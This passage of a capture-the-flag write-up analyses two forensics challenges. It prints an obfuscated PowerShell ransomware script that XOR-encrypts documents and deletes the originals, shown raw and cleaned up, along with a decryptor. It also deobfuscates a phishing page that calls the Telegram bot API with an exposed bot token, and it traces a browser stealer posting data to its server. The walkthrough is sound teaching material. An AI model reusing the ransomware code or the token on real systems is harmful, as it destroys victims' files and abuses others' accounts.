        $a34Vc = l34Vn $t90Vv $y90Va $z12Vb
    
        return [Convert]::ToBase64String($a34Vc)
    }
    
    function o12Vq {
        param([switch]$p34Vr)
    
        try {
            if ($p34Vr) {
                foreach ($q56Vs in l56Vn) {
                    $d34Vp = "dca01aq2/"
                    if (Test-Path $d34Vp) {
                        Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                            Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                            ForEach-Object {
                                $r78Vt = $_.FullName
                                if (Test-Path $r78Vt) {
                                    $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                    $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                    [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                    Remove-Item $r78Vt -Force
                                }
                            }
                    }
                r78Vt) {
                                    $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                    $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                    [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                    Remove-Item $r78Vt -Force
                                }
                            }
                    }
                }
            }
        }
        catch {}
    }
    
    if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
        o12Vq -p34Vr
        n90Vp
    }
```

- The code is obfuscated a bit so we can clear it up and get more meaningful script, for this step I used chatGPT 

```
    > cat attack_formatted.ps1
    # List of file extensions to target (Base64 encoded)
    $fileExtensions = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
    
    # Encoded warning message
    $encodedMessage = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
    
    # Encrypted keys (Base64 encoded)
    $key1 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
    $key2 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
    
    # Dictionary for simple character shifting cipher
    $shiftCipher = @{}
    $reverseShiftCipher = @{}
    
    # Create a shift cipher for uppercase letters
    For ($ascii = 65; $ascii -le 90; $ascii++) {
        $shiftCipher\[([char]$ascii)] = if($ascii -eq 90) { [char]65 } else { [char\]($ascii + 1) }
    }
    
    # Function to decode the warning message from Base64
    function DecodeMessage {
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedMessage))
    }
    
    # Function to retrieve file extensions from Base64 encoding
    function GetFileExtensions {
        return (Base64Decode $fileExtensions).Split(" ")
    }
    
    # Extend the shift cipher to include lowercase letters
    For ($ascii = 97; $ascii -le 122; $ascii++) {
        $shiftCipher\[([char]$ascii)] = if($ascii -eq 122) { [char]97 } else { [char\]($ascii + 1) }
    }
    
    # Function to decode a Base64 string
    function Base64Decode {
        param([string]$encodedString)
        return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedString))
    }
    
    # Decode the keys from Base64
    $decodedKey1 = Base64Decode $key1
    $decodedKey2 = Base64Decode $key2
    
    # Extend the shift cipher to include numbers
    For ($ascii = 48; $ascii -le 57; $ascii++) {
        $shiftCipher\[([char]$ascii)] = if($ascii -eq 57) { [char]48 } else { [char\]($ascii + 1) }
    }
    
    # Reverse the shift cipher mapping
    $shiftCipher.GetEnumerator() | ForEach-Object {
        $reverseShiftCipher[$_.Value] = $_.Key
    }
    
    # Function to XOR encrypt/decrypt byte arrays
    function XORBytes {
        param([byte[]]$data, [byte[]]$keyA, [byte[]]$keyB)
        $result = [byte[]]::new($data.Length)
        for ($i = 0; $i -lt $data.Length; $i++) {
            $byteA = $keyA[$i % $keyA.Length]
            $byteB = $keyB[$i % $keyB.Length]
            $result[$i] = $data[$i] -bxor $byteA -bxor $byteB
        }
        return $result
    }
    
    # Function to encrypt a file's contents
    function EncryptFile {
        param([byte[]]$fileData, [string]$keyA, [string]$keyB)
    
        if ($fileData -eq $null -or $fileData.Length -eq 0) {
            return $null
        }
    
        $keyBytesA = [System.Text.Encoding]::UTF8.GetBytes($keyA)
        $keyBytesB = [System.Text.Encoding]::UTF8.GetBytes($keyB)
        $encryptedData = XORBytes $fileData $keyBytesA $keyBytesB
    
        return [Convert]::ToBase64String($encryptedData)
    }
    
    # Function to find and encrypt specific file types
    function SecureFiles {
        param([switch]$encrypt)
    
        try {
            if ($encrypt) {
                foreach ($ext in GetFileExtensions) {
                    $directory = "dca01aq2/"
                    if (Test-Path $directory) {
                        Get-ChildItem -Path $directory -Recurse -ErrorAction Stop |
                            Where-Object { $_.Extension -match "^\.$ext$" } |
                            ForEach-Object {
                                $filePath = $_.FullName
                                if (Test-Path $filePath) {
                                    $fileBytes = [IO.File]::ReadAllBytes($filePath)
                                    $encryptedContent = EncryptFile $fileBytes $decodedKey1 $decodedKey2
                                    [IO.File]::WriteAllText("$filePath.secured", $encryptedContent)
                                    Remove-Item $filePath -Force
                                }
                            }
                    }
                }
            }
        }
        catch {}
    }
    
    # Check if the script is running under a specific user and machine
    if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
        SecureFiles -encrypt
        DecodeMessage
    }
```   


- So now we can understand and see that its performing XOR among three values
- We can simply repurpose existing code to decrypt the PDF file, I added the following extra code in same ps1 script :

```
    > diff attack_formatted.ps1 decrypt.ps1
    81a82,96
    > function DecryptFile {
    >     param([byte[]]$fileData, [string]$keyA, [string]$keyB)
    >
    >     if ($fileData -eq $null -or $fileData.Length -eq 0) {
    >         return $null
    >     }
    >
    >     $keyBytesA = [System.Text.Encoding]::UTF8.GetBytes($keyA)
    >     $keyBytesB = [System.Text.Encoding]::UTF8.GetBytes($keyB)
    >     $decryptedData = XORBytes $fileData $keyBytesA $keyBytesB
    >     $byteArray = [byte[]] $decryptedData
    >     [IO.File]::WriteAllBytes("flag.pdf", $byteArray)
    > }
    >
    114a130,132
    > $fileText = [IO.File]::ReadAllText("map.pdf.secured")
    > $fileBytes = [System.Convert]::FromBase64String($fileText)
    > DecryptFile $fileBytes $decodedKey1 $decodedKey2
```

![](https://i.imgur.com/I2Toyzc.png)

----------


## Tales for the Brave
> Solved by thewhiteh4t


- This was an interesting one because we were given a website as the starting point
- Looking at the source code, we can see `index.js` is loaded, contents :


![](https://i.imgur.com/JCKcHuS.png)

- So the javascript is obfuscated and uses `CryptoJS`, we can use an online deobfuscator : 


![](https://i.imgur.com/XjIy88q.png)

- Another better alternative is to use debugger in the browser, using debugger is simple, just open tools, click on debugger, hit pause and submit the form and the decoded javascript is revealed : 


![](https://i.imgur.com/bLswUQG.png)

- I copied this code into a `.js` file and cloned the website as well :

```
    > cat index.html
    <!DOCTYPE html>
    <html lang="en"><head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Newsletter Signup</title>
      <link rel="stylesheet" href="index.css">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
    </head>
    <body>
      <div class="newsletter">
        <div class="image-section">
          <img src="img/storytellingEldoriaMyths.png" alt="Rings">
        </div>
        <div class="form-section">
          <h1>Tales of Eldoria: Stories of Magic and Bravery for the Young and Curious</h1>
          <p>In the mystical lands of Eldoria, where dragons soar and ancient magic pulses through the air, storytelling is more than just a pastime—it's a tradition that bridges generations. Imagine a magical evening where children gather around glowing crystal orbs, listening to the mesmerizing myths and legends of Eldoria. These tales teach courage, friendship, and the magic of harmony.</p>
          <form id="newsletterForm">
            <input type="email" id="email" placeholder="Email">
                    <input type="text" id="descriptionField" placeholder="Description">
            <div class="checkbox-group">
              <p>The newsletter offers:</p>
              <label><input class="cb" id="c1" type="checkbox"> Legends of Dragons</label>
              <label><input class="cb" id="c2" type="checkbox"> Ancient Magic</label>
              <label><input class="cb" id="c3" type="checkbox"> Adventures of Heroes</label>
              <label><input class="cb" id="c4" type="checkbox"> Eldoria Myths</label>
            </div>
            <div class="buttons">
                <button type="submit" data-node-outlined="false" class="button primary">SUBMIT</button>
            </div>
          </form>
        </div>
      </div>
      <script src="./decrypted.js"></script>
    
    
    </body></html>
```

- After some inspection I noticed an interesting variable `_$_5975` and how it was used :

```
    function f(oferkfer, icd) { const channel_id = -1002496072246; var enc_token = _$_5975\\[0]; if (oferkfer === G(_$_5975[1]) && CryptoJS[_$_5975[7]\](sequence[_$_5975[6]](_$_5975[5]))\[_$_5975[4]\](CryptoJS[_$_5975[3]\][_$_5975[2]]) === _$_5975\\[8]) { var decrypted = CryptoJS[_$_5975[12]\][_$_5975[11]\](enc_token, CryptoJS\[_$_5975[3]\][_$_5975[9]]\[_$_5975[10]](oferkfer), { drop: 192 })\[_$_5975[4]\](CryptoJS[_$_5975[3]\][_$_5975[9]]); var HOST = _$_5975\\[13] + String[_$_5975[14]\](0x2f) + String\[_$_5975[14]\](0x62) + String\[_$_5975[14]\](0x6f) + String\[_$_5975[14]\](0x74) + decrypted; var xhr = new XMLHttpRequest(); xhr\[_$_5975[15]] = function () { if (xhr[_$_5975[16]] == XMLHttpRequest[_$_5975[17]]) { const resp = JSON[_$_5975[10]\](xhr[_$_5975[18]]); try { const link = resp\[_$_5975[20]\][_$_5975[19]]; window\[_$_5975[23]\][_$_5975[22]\](link) } catch (error) { alert(_$_5975\[24]) } } }; xhr[_$_5975[29]\](_$_5975[25], HOST + String[_$_5975[14]](0x2f) + _$_5975\[26] + icd + _$_5975[27] + channel_id + _$_5975[28]); xhr[_$_5975[30]\](null) } else { alert(_$_5975[24]) } }
```

- Its an array and multiple items from the array were being used, so I decided to print the array, by adding a small loop : 

```
    for (var i = 0; i < 31; i++) {
      console.log(i, _$_5975[i])
    }
```

![](https://i.imgur.com/saOoRYc.png)

- As we can see, some encoded strings, parts of a URL, telegram and most importantly `RC4Drop` which is a type of cipher available in `CryptoJS`
- After this I substituted the values according to array index and ended up with the following :

```
    if (oferkfer === G('s3cur3k3y') && CryptoJS.SHA256(sequence.join('')).toString(CryptoJS.enc.Base64) === '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=') {
            var decrypted = CryptoJS.RC4Drop.decrypt(enc_token, CryptoJS.enc.Utf8.parse(oferkfer), {
                drop: 192
            }).toString(CryptoJS.enc.Utf8);
            var HOST = 'https://api.telegram.org' + String.fromCharCode(0x2f) + String.fromCharCode(0x62) + String.fromCharCode(0x6f) + String.fromCharCode(0x74) + decrypted;
    
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    const resp = JSON.parse(xhr.responseText);
                    try {
                        const link = resp.result.text;
                        window.location.replace(link)
                    } catch (error) {
                        alert('Form submitted!')
                    }
                }
            };
            console.log('GET', HOST + String.fromCharCode(0x2f) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5')
            xhr.open('GET', HOST + String.fromCharCode(0x2f) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5');
            //xhr.send(null)
        } else {
            alert('Form submitted!')
        }
```

- Decryption block is executed if the condition is satisfied : 

```
    oferker -> email before @tld
    G('s3cur3k3y') -> 0p3r4t10n_4PT_Un10n
```

- So the email to satisfy the condition should be `0p3r4t10n_4PT_Un10n@abc.com` but since the script is running locally we can simply bypass the conditions
- In the end the code block sends a GET request so I inspected the URL : 

```
    console.log('GET', HOST + String.fromCharCode(0x2f) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5')
    
    GET https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=NaN&from_chat_id=-1002496072246&message_id=5 decrypted.js:128:17
```

- So the telegram API is being called and we get the following things : 

```
    Bot ID : bot7767830636
    Bot token : AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc
    chat_id : Null
    from_chat_id : -1002496072246
    message_id : 5
```

- `forwardMessage` does exactly what the name suggests, it will forward a message from one chat to another, but some requirements need to be fulfilled for this to happen : 

```
    Bot should be present on both chats
```

- But in the URL we can see that `chat_id` is missing, so we will make our own by creating a `group` in telegram and then we can add the bot to our group
- But we don’t know the name of the bot, to solve this there is another endpoint we can call : 

```
    > curl -s 'https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getMe' | json_pp
    
    {
       "ok" : true,
       "result" : {
          "can_connect_to_business" : false,
          "can_join_groups" : true,
          "can_read_all_group_messages" : false,
          "first_name" : "OperationEldoriaBot",
          "has_main_web_app" : false,
          "id" : 7767830636,
          "is_bot" : true,
          "supports_inline_queries" : false,
          "username" : "OperationEldoriaBot"
       }
    }
```

- After adding the bot to our group we can iterate from message IDs `1 - 10` to get all the messages : 


![](https://i.imgur.com/1b1xrhh.png)



- We got a zip file which contains a tool that targets Brave browser, inside the zip is a windows PE file
- Time for dynamic analysis, after using `Process Explorer, Process Monitor` etc I finally checked `WireShark` for network activity because a browser stealer is expected to send the information
- And a single DNS query popped up : `z0lsc2S65u.htb` which obviously does not exists
- So I did the following :

```
    Added the domain in windows Hosts file
    Started a PHP server on my other box on port 31337 as seen in wireshark
    Launched Brave.exe again
```

![](https://i.imgur.com/Iaaj6RH.png)



- And we get a POST request to our server


![](https://i.imgur.com/LTALsWD.png)



- JSON data was being sent but more interestingly there was an `Authorization` header with JWT :


![](https://i.imgur.com/vTH0E4n.png)

- Double base64 encoded flag : 

```
    HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}
```
